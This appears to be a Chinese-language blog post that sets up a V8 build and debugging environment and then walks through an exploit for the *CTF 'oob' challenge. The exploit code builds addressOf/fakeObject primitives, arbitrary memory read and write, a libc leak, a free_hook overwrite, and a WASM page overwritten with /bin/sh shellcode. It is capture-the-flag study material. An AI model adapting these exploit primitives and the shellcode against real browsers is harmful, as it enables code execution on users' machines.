---
layout: post
title:  "v8环境配置"
categories: pwn
tags: debug
excerpt: chrome v8 环境配置
mathjax: true
---

* content
{:toc}

### Overview

开始v8 引擎的环境搭建

### 0x00 配置代理
需要的代理有两个
1. git 代理
`git config --global http.proxy http://ip:port`
2. bash 代理(给curl用)
```
export http_proxy="http://ip:port/"
export https_proxy=$http_proxy
```

### 0x01 编译安装

安装depot_tools
```
git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
echo 'export PATH=$PATH:"/path/to/depot_tools"' >> ~/.bashrc
```
安装ninja
```
git clone https://github.com/ninja-build/ninja.git
cd ninja && ./configure.py --bootstrap && cd ..
echo 'export PATH=$PATH:"/path/to/ninja"' >> ~/.bashrc
```
编译v8

```
fetch v8      #  下载v8代码
cd v8  
gclient sync  # 同步一下
tools/dev/v8gen.py x64.debug
ninja -C out.gn/x64.debug
```

### 0x02 vscode + ccls

```
git clone https://github.com/MaskRay/ccls
cd ccls
# 在ccls根目录下执行
# 第0步，下载第三方依赖
git submodule update --init --recursive
# 第一步，下载llvm的二进制包
wget -c http://releases.llvm.org/8.0.0/clang+llvm-8.0.0-x86_64-linux-gnu-ubuntu-18.04.tar.xz
# 解压二进制包
tar xf clang+llvm-8.0.0-x86_64-linux-gnu-ubuntu-18.04.tar.xz
# 在当前文件目录下执行cmake 执行结果保存到Release文件夹中
cmake -H. -BRelease -DCMAKE_BUILD_TYPE=Release -DCMAKE_PREFIX_PATH=$PWD/clang+llvm-8.0.0-x86_64-linux-gnu-ubuntu-18.04
cmake --build Release
# 开始编译并安装
cd Release
# 这里使用4线程编译，当然如果你的电脑够强的话，可以直接-j或者使用更搞核数加快编译
make -j4
# 编译完成，安装
sudo make install
```

### 0x03 starctf_oob  

```
var obj = {"a":1};
var obj_array = [obj];
var float_array = [1.1];

var buf = new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);

var obj_array_map = obj_array.oob();
var float_array_map = float_array.oob();

function f2i(f){
    float64[0]=f;
    return bigUint64[0];
}
function i2f(i){
    bigUint64[0] = i;
    return float64[0]
}
function hex(i){
    return i.toString(16).padStart(16,"0");
}

function addressOf(object){
    obj_array[0] = object;
    obj_array.oob(float_array_map); // map  obj -> float
    var object_addr = obj_array[0];
    obj_array.oob(obj_array_map); // restore
    return f2i(object_addr)-1n;
}

function fakeObject(fake_object_addr){
    float_array[0] = i2f(fake_object_addr+1n);
    float_array.oob(obj_array_map);  // map float -> object 
    var fake_object = float_array[0]; 
    float_array.oob(float_array_map); // restore 
    return fake_object;
}

var evil_array = [
    float_array_map, //Map
    0.0,  //properties
    i2f(0x4141414141414141n), //elements 
    i2f(0x400000000n), //length
    1.1,
    2.2
];

//%DebugPrint(evil_array);
var leak_addr = addressOf(evil_array)
console.log("leak addr : 0x"+hex(leak_addr));
var fake_obj_addr = leak_addr - 0x40n +0x10n // 调试确定 0x40
console.log("fake object addr : 0x"+hex(fake_obj_addr));

//%SystemBreak(); 

/*
leak addr : 0x000033720e4cf360
fake object addr : 0x000033720e4cf330
0x33720e4cf551 <BigInt 56564959212336>

0000| 0x33720e4cf320 --> 0x2429ad4414f9 --> 0x2429ad4401
0008| 0x33720e4cf328 --> 0x600000000
0016| 0x33720e4cf330 --> 0x253fdf242ed9 --> 0x400002429ad4401
0024| 0x33720e4cf338 --> 0x0
0032| 0x33720e4cf340 ("AAAAAAAA")
0040| 0x33720e4cf348 --> 0x400000000
0048| 0x33720e4cf350 --> 0x3ff199999999999a
0056| 0x33720e4cf358 --> 0x400199999999999a

*/

var fake_obj = fakeObject(fake_obj_addr);
function read64(addr){
    evil_array[2] = i2f(addr - 0x10n +1n);//overwrite element address
    var leak_data = f2i(fake_obj[0])
    return leak_data
}

function write64(addr,data){
    evil_array[2] = i2f(addr - 0x10n+1n) //
    fake_obj[0] = i2f(data);
    return ;
}

function get_text_address(){
    var a = [1.1, 2.2, 3.3];
    //%DebugPrint(a);
    var code_addr = read64(addressOf(a.constructor) + 0x30n);
    var leak_d8_addr = read64(code_addr + 0x41n);
    console.log("[*] find libc leak_d8_addr: 0x" + hex(leak_d8_addr));
    return leak_d8_addr
}

function get_text_address_random(){
    var a = [1.1, 2.2, 3.3];
    var start_addr = addressOf(a);
    var leak_d8_addr = 0n;
    while(1)
    {
        start_addr -= 0x8n;
        leak_d8_addr = read64(start_addr);
        if((leak_d8_addr & 0xfffn) == 0x05b0n && read64(leak_d8_addr) == 0x56415741e5894855n)
        {
            console.log("[*] Success find leak_d8_addr: 0x" + hex(leak_d8_addr));
            break;
        }
    }
    console.log("[*] Done.");
}

var leak_addr = get_text_address();
//0x126d7a0

var d8_base = leak_addr - 0xf91780n;
var libc_start_main_got = d8_base+0x126d7a0n;
var libc_base = read64(libc_start_main_got) - 0x21ab0n
var system = libc_base + 0x4f440n
var free_hook = libc_base + 0x3ed8e8n
console.log("free_hook: 0x"+hex(free_hook));
//write64(free_hook,system); // 写入失败


/*
报错 
RAX  0x7f88522c0000
► 0x55e6afc4fd2d    mov    rax, qword ptr [rax + 0x30]

free_hook: 0x00007f88522f68e8  
写入的地址不对, 这是因为我们write64写原语使用的是FloatArray的写入操作，
而Double类型的浮点数数组在处理7f开头的高地址时会出现将低20位与运算为0，从而导致上述操作无法写入的错误。这个解释不一定正确
使用DataView 对象
*/

function write64_dataview(addr, data){
    var data_buf = new ArrayBuffer(8);
    var data_view = new DataView(data_buf);
    var buf_backing_store_addr = addressOf(data_buf) + 0x20n;
    write64(buf_backing_store_addr, addr);
    data_view.setFloat64(0, i2f(data), true);
    //console.log("[*] write to : 0x" +hex(addr) + ": 0x" + hex(data));  // 如果输出会导致gdb报错
}
write64_dataview(free_hook,system);

function get_shell()
{
    let get_shell_buffer = new ArrayBuffer(0x1000);
    let get_shell_dataview = new DataView(get_shell_buffer);
    get_shell_dataview.setFloat64(0, i2f(0x0068732f6e69622fn)); // str --> /bin/sh\x00 
    //%DebugPrint(get_shell_dataview);
    //%SystemBreak();
}

get_shell()

// ?? 依然借助了之前的write64 函数，那么修改backing_store_addr 就能成功吗 ？ 二者区别何在
```

### wasm 利用 
wasm 使用一种体积小，加载块的新格式,用于游戏，3D建模,加密库等领域。
* wasm 是一套底层的指令集
* 原生代码C/C++ 等语言可转化成wasm

逆向题目中曾经接触过,在漏洞利用中的使用步骤如下
1. 加载一段wasm代码到内存中
2. 通过addresssOf原语找到存放wasm的内存地址
3. 通过任意地址写原语用shellcode替换原本wasm的代码内容
4. 调用wasm的函数接口即可触发调用shellcode

https://wasdk.github.io/WasmFiddle/ 在线工具 左下角选择codebuffer 

c代码
```
int main() { 
  return 42;
}
```
对应wasmCode 部分
```
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
​
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;
​
var f_addr = addressOf(f);
console.log("[*] leak wasm func addr: 0x" + hex(f_addr)); // 泄露wasm函数地址
%SystemBreak();
```

利用job命令查看函数结构对象，经过Function–>shared_info–>WasmExportedFunctionData–>instance等一系列调用关系，在instance+0×88的固定偏移处，就能读取到存储wasm代码的内存页起始地址

```
var shareinfo = read64(f_addr+0x18n)-0x1n;
var wasm_export = read64(shareinfo+0x8n)-0x1n;
var instance = read64(wasm_export+0x10n)-0x1n;
var rwx_addr = read64(instance+0x88n);
console.log("rwx_addr: 0x"+hex(rwx_addr));
```

写入shellcode
```
/* /bin/sh for linux x64
 char shellcode[] = "\x6a\x3b\x58\x99\x52\x48\xbb\x2f \x2f\x62\x69\x6e\x2f\x73\x68\x53 \x54\x5f\x52\x57\x54\x5e\x0f\x05";
*/

var shellcode = [0x2fbb485299583b6an,0x5368732f6e69622fn,0x050f5e5457525f54n];
// 借助dataview, 将backing_store 改成 rwx_addr 
function write64_shellcode(){
    var data_buf = new ArrayBuffer(24);
    var data_view = new DataView(data_buf);
    var buf_backing_store_addr = addressOf(data_buf) + 0x20n;
    write64(buf_backing_store_addr, rwx_addr);
    data_view.setFloat64(0, i2f(shellcode[0]), true);
    data_view.setFloat64(8, i2f(shellcode[1]), true);
    data_view.setFloat64(16, i2f(shellcode[2]), true);
    f();
}
```

### 参考
https://www.freebuf.com/vuls/203721.html
